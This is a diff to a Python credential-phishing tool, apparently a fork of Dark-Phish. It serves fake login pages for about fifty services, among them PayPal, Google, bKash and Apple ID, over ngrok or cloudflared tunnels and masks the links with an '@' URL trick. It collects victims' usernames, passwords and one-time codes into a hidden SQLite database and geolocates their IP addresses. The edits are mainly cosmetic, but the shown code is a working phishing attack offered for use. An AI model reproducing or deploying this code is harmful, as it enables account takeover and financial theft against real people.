@@ -21,25 +21,22 @@ except ModuleNotFoundError as error:
     print(error)
     sys.exit()
 
-version = 2.2
-host = "127.0.0.1"
-port = "8080"
+version = "2.0.8"
+host    = "0.0.0.0"
+port    = 8080
 
 def logo():
     os.system("clear")
     print("""\033[1;91m
-██████╗  █████╗ ██████╗ ██╗  ██╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
-██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██╔══██╗██║  ██║██║██╔════╝██║  ██║
-██║  ██║███████║██████╔╝█████╔╝█████╗██████╔╝███████║██║███████╗███████║
-██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██╔═══╝ ██╔══██║██║╚════██║██╔══██║
-██████╔╝██║  ██║██║  ██║██║  ██╗     ██║     ██║  ██║██║███████║██║  ██║
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \033[0;0mv{}
-                                    \033[1;0m Coded by Sajjad | Cyber-Anonymous |
-
+          __                 _____ _____     _     _
+       __|  |___ ___ _ _ ___|     |  |  |___|_|___| |_
+      |  |  | -_|_ -| | |_ -|   --|     |  _| |_ -|  _|
+      |_____|___|___|___|___|_____|__|__|_| |_|___|_|
+                                                         \033[0;0mv{}
 \033[0;0m""".format(version))
 
 def disclaimer():
-    print(" \033[1;100;97m[::] Disclaimer: Developers are not responsible for any [::]\033[0;0;0m\n \033[1;100;97m[::] misuse or damage caused by Dark-Phish.             [::]\033[0;0;0m")
+    print(" \033[1;100;97m[::] Disclaimer: Developers are not responsible for any infor  [::]\033[0;0;0m\n \033[1;100;97m[::] misuse or damage caused by Dark-Phish.                    [::]\033[0;0;0m")
 
 def check_update():
     try:
@@ -86,7 +83,6 @@ def save_data(site, username, password, otp):
     os.chdir("..") 
     os.chdir("..") 
     try:
-        
         conn = sqlite3.connect(".credentials.db")
         conn.execute("""
         CREATE TABLE IF NOT EXISTS data (
@@ -99,7 +95,7 @@ def save_data(site, username, password, otp):
         """)
         conn.execute("INSERT INTO data (site, username, password, otp) VALUES (?, ?, ?, ?)", (site, username, password, otp))
         conn.commit()
-        print("\nCredentials saved to database.\n")
+        print("\nCredentials saved to database.")
     except sqlite3.Error as error:
         print("Database error:", error)
     finally:
@@ -387,18 +383,19 @@ logo()
 disclaimer()
 
 print("""
-[\033[1;92m01\033[0;0m] Facebook      [\033[1;92m13\033[0;0m] Samsung ID   [\033[1;92m25\033[0;0m] Adobe         [\033[1;92m37\033[0;0m] Spotify       [\033[1;92m49\033[0;0m] Flipkart  
-[\033[1;92m02\033[0;0m] Twitter       [\033[1;92m14\033[0;0m] WordPress    [\033[1;92m26\033[0;0m] Amazon        [\033[1;92m38\033[0;0m] TikTok        [\033[1;92m50\033[0;0m] PhonePe
-[\033[1;92m03\033[0;0m] Instagram     [\033[1;92m15\033[0;0m] GitLab       [\033[1;92m27\033[0;0m] Ebay          [\033[1;92m39\033[0;0m] Discord       [\033[1;92mcustom\033[0;0m] Custom
-[\033[1;92m04\033[0;0m] Snapchat      [\033[1;92m16\033[0;0m] ProtonMail   [\033[1;92m28\033[0;0m] Netflix       [\033[1;92m40\033[0;0m] Daraz         [\033[1;92m0\033[0;0m] Exit 
-[\033[1;92m05\033[0;0m] GitHub        [\033[1;92m17\033[0;0m] Linkedin     [\033[1;92m29\033[0;0m] Messenger     [\033[1;92m41\033[0;0m] WhatsApp
-[\033[1;92m06\033[0;0m] Google        [\033[1;92m18\033[0;0m] Steam        [\033[1;92m30\033[0;0m] Twitter-X     [\033[1;92m42\033[0;0m] Telegram
-[\033[1;92m07\033[0;0m] Yahoo         [\033[1;92m19\033[0;0m] Twitch       [\033[1;92m31\033[0;0m] Galaxy Store  [\033[1;92m43\033[0;0m] Signal
-[\033[1;92m08\033[0;0m] PlayStation   [\033[1;92m20\033[0;0m] VK           [\033[1;92m32\033[0;0m] Google Drive  [\033[1;92m44\033[0;0m] Imo
-[\033[1;92m09\033[0;0m] PayPal        [\033[1;92m21\033[0;0m] Pinterest    [\033[1;92m33\033[0;0m] Google Photos [\033[1;92m45\033[0;0m] bKash
-[\033[1;92m10\033[0;0m] Microsoft     [\033[1;92m22\033[0;0m] Wi-Fi        [\033[1;92m34\033[0;0m] OneDrive      [\033[1;92m46\033[0;0m] Nagad 
-[\033[1;92m11\033[0;0m] Dropbox       [\033[1;92m23\033[0;0m] Badoo        [\033[1;92m35\033[0;0m] Playstore     [\033[1;92m47\033[0;0m] DBBL(Rocket)
-[\033[1;92m12\033[0;0m] Apple ID      [\033[1;92m24\033[0;0m] Bitcoin      [\033[1;92m36\033[0;0m] Snaptube      [\033[1;92m48\033[0;0m] Paytm""")
+[\033[1;92m01\033[0;0m] Facebook     [\033[1;92m14\033[0;0m] WordPress   [\033[1;92m27\033[0;0m] Ebay          [\033[1;92m40\033[0;0m] Daraz
+[\033[1;92m02\033[0;0m] Twitter      [\033[1;92m15\033[0;0m] GitLab      [\033[1;92m28\033[0;0m] Netflix       [\033[1;92m41\033[0;0m] WhatsApp
+[\033[1;92m03\033[0;0m] Instagram    [\033[1;92m16\033[0;0m] ProtonMail  [\033[1;92m29\033[0;0m] Messenger     [\033[1;92m42\033[0;0m] Telegram
+[\033[1;92m04\033[0;0m] Snapchat     [\033[1;92m17\033[0;0m] Linkedin    [\033[1;92m30\033[0;0m] Twitter-X     [\033[1;92m43\033[0;0m] Signal
+[\033[1;92m05\033[0;0m] GitHub       [\033[1;92m18\033[0;0m] Steam       [\033[1;92m31\033[0;0m] Galaxy Store  [\033[1;92m44\033[0;0m] Imo
+[\033[1;92m06\033[0;0m] Google       [\033[1;92m19\033[0;0m] Twitch      [\033[1;92m32\033[0;0m] Google Drive  [\033[1;92m45\033[0;0m] bKash
+[\033[1;92m07\033[0;0m] Yahoo        [\033[1;92m20\033[0;0m] VK          [\033[1;92m33\033[0;0m] Google Photos [\033[1;92m46\033[0;0m] Nagad 
+[\033[1;92m08\033[0;0m] PlayStation  [\033[1;92m21\033[0;0m] Pinterest   [\033[1;92m34\033[0;0m] OneDrive      [\033[1;92m47\033[0;0m] DBBL(Rocket)
+[\033[1;92m09\033[0;0m] PayPal       [\033[1;92m22\033[0;0m] Wi-Fi       [\033[1;92m35\033[0;0m] Playstore     [\033[1;92m48\033[0;0m] Paytm
+[\033[1;92m10\033[0;0m] Microsoft    [\033[1;92m23\033[0;0m] Badoo       [\033[1;92m36\033[0;0m] Snaptube      [\033[1;92m49\033[0;0m] Flipkart
+[\033[1;92m11\033[0;0m] Dropbox      [\033[1;92m24\033[0;0m] Bitcoin     [\033[1;92m37\033[0;0m] Spotify       [\033[1;92m50\033[0;0m] PhonePe
+[\033[1;92m12\033[0;0m] Apple ID     [\033[1;92m25\033[0;0m] Adobe       [\033[1;92m38\033[0;0m] TikTok        [\033[1;92mcustom\033[0;0m] Custom
+[\033[1;92m13\033[0;0m] Samsung ID   [\033[1;92m26\033[0;0m] Amazon      [\033[1;92m39\033[0;0m] Discord       [\033[1;92m0\033[0;0m] Exit""")
 
 while True:
     try:
@@ -418,7 +415,7 @@ else:
     pass
 
 
-print("""\n
+print("""
 [\033[1;92m01\033[0;0m] Localhost
 [\033[1;92m02\033[0;0m] Ngrok
 [\033[1;92m03\033[0;0m] Cloudflared 
@@ -429,7 +426,7 @@ print("""\n
 Tunnels = 6
 while True:
     try:
-        tunnel = input("\nOPTION: ")
+        tunnel = input("OPTION: ")
         tunnel = int(tunnel)
         if (tunnel > Tunnels):
             print("\033[1;91m[!] Invalid option!\033[0;0m\n")
@@ -560,8 +557,8 @@ keywords = {
 "PayPal" : "https://www.paypal.com@",
 "Microsoft" : "https://account.microsoft.com@",
 "Dropbox" : "https://www.dropbox.com@",
-"Apple ID" : "https://www.appleid.com@",
-"Samsung ID" : "https://www.samsung.com@",
+"Apple" : "https://www.appleid.com@",
+"Samsung" : "https://www.samsung.com@",
 "WordPress" : "https://www.wordpress.com@",
 "GitLab" : "https://gitlab.com@",
 "ProtonMail" : "https://proton.me@",
@@ -616,7 +613,7 @@ def server(action):
         os.system("""
         php -S {}:{} > tunnel.txt 2>&1 & sleep 5
         """.format(host, port))
-        
+
         os.system("""
         grep -o "http://[-0-9A-Za-z.:]*" "tunnel.txt" -oh > link.txt
         """)
@@ -715,7 +712,7 @@ sleep 12""".format(host, port))
     else:
         condition = None
     print("\033[1;92mSend link:\033[0;0m",link)
-    
+
     if (condition == "y" or condition == "yes"):
         keyword = keywords[action]
         modified= modify_url(keyword, link)
@@ -782,7 +779,6 @@ def stop():
 
 def work():
     try:
-        print("")
         while not (os.path.exists("log.txt")):
             print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
             time.sleep(1)
@@ -812,7 +808,6 @@ def work_otp():
     password = ""
     otp_code = ""
     try:
-        print("")
         while not (os.path.exists("log.txt")):
             print("\r\033[1;92mWaiting for the credentials   \033[0;0m",end="")
             time.sleep(1)
@@ -897,8 +892,6 @@ def ip_data():
                 print("\033[1;92mRegion:\033[0;0m",data["region"])
                 print("\033[1;92mRegion name:\033[0;0m",data["regionName"])
                 print("\033[1;92mZip:\033[0;0m",data["zip"])
-                
-                
                 print("\033[1;92mLocation:\033[0;0m {},{}".format(data["lat"], data["lon"]))
                 print("\033[1;92mTime zone:\033[0;0m",data["timezone"])
                 print("\033[1;92mISP:\033[0;0m", data["isp"])
@@ -931,7 +924,6 @@ def available_tunnels():
         local_tunnel()
     else:
         print("\033[1;91m[!] Invalid option!\033[0;0m\n")
-            
 
 if (option==1):
     try:
@@ -1288,10 +1280,10 @@ elif (option==12):
                         username = line.replace("login_username=","Username: ",1)
                     elif "login_password" in line:
                         password = line.replace("login_password=","Password: ",1)
-                    
+
                 print(username)
                 print(password)
-                
+
                 stop()
                 ip_data()
                 try:
@@ -1301,8 +1293,7 @@ elif (option==12):
                 save_data(site, username, password, otp)
             except Exception as error:
                 print(error)
-            
-            
+
 elif (option==13):
             try:
                 site = "Samsung"
